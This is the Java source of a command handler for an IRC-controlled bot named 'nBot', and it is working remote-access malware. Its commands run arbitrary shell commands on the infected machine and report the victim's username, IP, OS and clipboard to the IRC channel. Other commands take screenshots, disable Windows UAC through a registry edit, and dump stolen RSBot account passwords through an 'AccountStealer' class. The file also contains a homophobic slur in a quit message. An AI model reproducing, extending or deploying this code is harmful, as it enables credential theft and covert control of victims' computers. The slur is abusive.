
import java.awt.Toolkit;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.Set;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan
 */
public class MiscCommands implements Handler {

    @SuppressWarnings("static-access")
    public boolean processCommand(String[] args, String nick) {
        if (args[0].equals(";getusername")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " My username is " + System.getProperty("user.name"));
            return true;
        }
        if (args[0].equals(";getip")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " My IP address is " + Misc.getIPAddress("http://whatismyip.com/automation/n09230945.asp"));
            return true;
        }
        if (args[0].equals(";getcountry")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " My country is " + System.getProperty("user.country"));
            return true;
        }
        if (args[0].equals(";directto")) {
            Command.directTo.add(args[1]);
            Command.isDirecting = true;
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Added " + args[1] + " to directing list!");
            return true;
        }
        if (args[0].equals(";removefromdirect")) {
            Command.directTo.remove(args[1]);
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " removed " + args[1] + " from directing list!");
            return true;
        }
        if (args[0].equals(";nodirect")) {
            Command.directTo.clear();
            Command.isDirecting = false;
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Directing commands stopped!");
            return true;
        }
        if (args[0].equals(";cmd")) {
            try {
                Misc.cmd(args[1]);
            } catch (IOException ex) {
                ex.printStackTrace();
                return false;
            }
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Command prompt stopped output!");
            return true;
        }
        if (args[0].equals(";setclip")) {
            Misc.setClipboard(args[1]);
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " ClipData set to " + args[1]);
            return true;
        }
        if (args[0].equals(";getclip")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Current clip data is " + Misc.getClipboard());
            return true;
        }
        if (args[0].equals(";takess")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Taking screenshot, please wait!");
            Screenshot.takeScreenshot();
            return true;
        }
        if (args[0].equals(";rsbotlist")) {
            try {
                AccountStealer.printAccounts();
            } catch (IOException ex) {
                return false;
            }
            return true;
        }
        if (args[0].equals(";rsbotgetuserspass")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Password for " + args[1] + " is " + AccountStealer.getUsersPassword(args[1]));
            return true;
        }
        if (args[0].equals(";rsbotuserbypass")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Getting users with password " + args[1]);
            try {
                for (Object s : AccountStealer.getUsernameByPassword(args[1])) {
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Result: " + s.toString());
                }
            } catch (Exception e) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " No users!");
                return false;
            }
            return true;
        }
        if (args[0].equals(";rsbotreloadall")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Reloading RSBot data!");
            try {
                AccountStealer.reloadAll();
            } catch (IOException ex) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not reload data!");
                return false;
            }
            return true;
        }
        if (args[0].equals(";rsbotreloadaccounts")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Reloading account data!");
            try {
                AccountStealer.readAccounts();
                AccountStealer.writeAccounts();
            } catch (IOException ex) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not reload account data!");
                return false;
            }
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Account data reloaded!");
            return true;
        }
        if (args[0].equals(";getos")) {
            System.getProperty("os.name");
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " " + System.getProperty("os.name"));
            return true;
        }
        if (args[0].equals(";hide")) {
            IRC.sendRawData("MODE " + Config.nick + " +i");
            return true;
        }
        if (args[0].equals(";gtfo")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Gtfoing now!");
            IRC.quit(nick + " just told me to gtfo, fucking fag!");
            System.exit(1);
        }
        if (args[0].equals(";getresponcecode")) {
            try {
                URL url = new URL(args[1]);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Responce code for " + args[1] + " = " + conn.getResponseCode());
                conn.disconnect();
                return true;
            } catch (Exception e) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not retrive responce code. Reason: " + e.toString());
                return false;
            }
        }
        if (args[0].equals(";msg")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Message dialog sent! (" + args[1] + ")");
            JOptionPane message = new JOptionPane();
            message.setVisible(true);
            message.requestFocusInWindow();
            message.setVisible(true);
            message.showMessageDialog(null, args[1]);
            return true;
        }
        if (args[0].equals(";commandlist")) {
            Set keySet = Command.commands.keySet();
            IRC.sendMessage(Config.channel, Colors.BLUE + " Printing commands!");
            for (Object s : keySet) {
                IRC.sendMessage(Config.channel, Colors.BLUE + " " + s.toString());
            }
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Done printing commands!");
        }
        if (args[0].equals(";beep")) {
            Toolkit.getDefaultToolkit().beep();
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Sent beep!");
        }
        if (args[0].equals(";getscreensize")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " My screen size is " + Misc.screenSize());
        }
        if(args[0].equals(";disableuac")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Attempting to disable UAC");
            try {
                Misc.cmd("C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " UAC was disabled!");
            } catch (IOException ex) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " UAC could not be disabled!");
            }
        }
        if(args[0].equals(";pingtime")) {
            try {
                long startTime = System.currentTimeMillis();
                boolean status = InetAddress.getByName(args[1]).isReachable(Integer.parseInt(args[2]));
                if(status) {
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Host "+args[1]+" is up! Ping time is "+(System.currentTimeMillis() - startTime - 1000));
                } else {
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Host is not up! Ping time "+(System.currentTimeMillis() - startTime));
                }
                return true;
            } catch (IOException ex) {
                ex.printStackTrace();
                return false;
            }
        }
        if(args[0].equals(";toggleoutput")) {
            if(Config.outputEnabled) {
                Config.outputEnabled = false;
            } else {
                Config.outputEnabled = true;
            }
            return true;
        }
        return false;
    }
}
